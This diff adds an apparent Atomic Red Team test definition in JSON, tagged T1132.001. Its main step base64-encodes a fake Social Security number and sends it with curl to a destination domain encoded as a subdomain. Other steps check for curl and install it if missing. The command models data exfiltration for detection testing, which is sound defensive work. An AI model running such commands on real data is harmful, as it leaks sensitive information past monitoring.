@@ -1,0 +1,92 @@
+{
+  "id": "2d97c626-7652-449e-a986-b02d9051c298",
+  "name": "Base64 Encoded data (freebsd)",
+  "description": "Utilizing a common technique for posting base64 encoded data.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43",
+      "type": "execute-command",
+      "data": {
+        "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "name": "Check dependency 1/1",
+      "description": "Requires curl\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "acf505ae-2d58-48f4-879c-e4eee40675aa",
+      "name": "Resolve dependency 1/1",
+      "description": "Requires curl\n",
+      "type": "execute-command",
+      "data": {
+        "command": "pkg install -y curl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c87b2026-bb5d-4650-8bd4-3d77c8b30575",
+      "name": "Re-check dependency 1/1",
+      "description": "Requires curl\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "p": "on-success",
+      "o": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43"
+    },
+    {
+      "s": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "p": "on-failure",
+      "o": "acf505ae-2d58-48f4-879c-e4eee40675aa"
+    },
+    {
+      "s": "acf505ae-2d58-48f4-879c-e4eee40675aa",
+      "p": "on-success",
+      "o": "c87b2026-bb5d-4650-8bd4-3d77c8b30575"
+    },
+    {
+      "s": "c87b2026-bb5d-4650-8bd4-3d77c8b30575",
+      "p": "on-failure",
+      "o": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43"
+    }
+  ],
+  "tags": [
+    "T1132.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "base64_data",
+      "type": "string",
+      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
+      "value": "MTExLTExLTExMTE="
+    },
+    {
+      "name": "destination_url",
+      "type": "url",
+      "description": "Destination URL to post encoded data.",
+      "value": "redcanary.com"
+    }
+  ]
+}
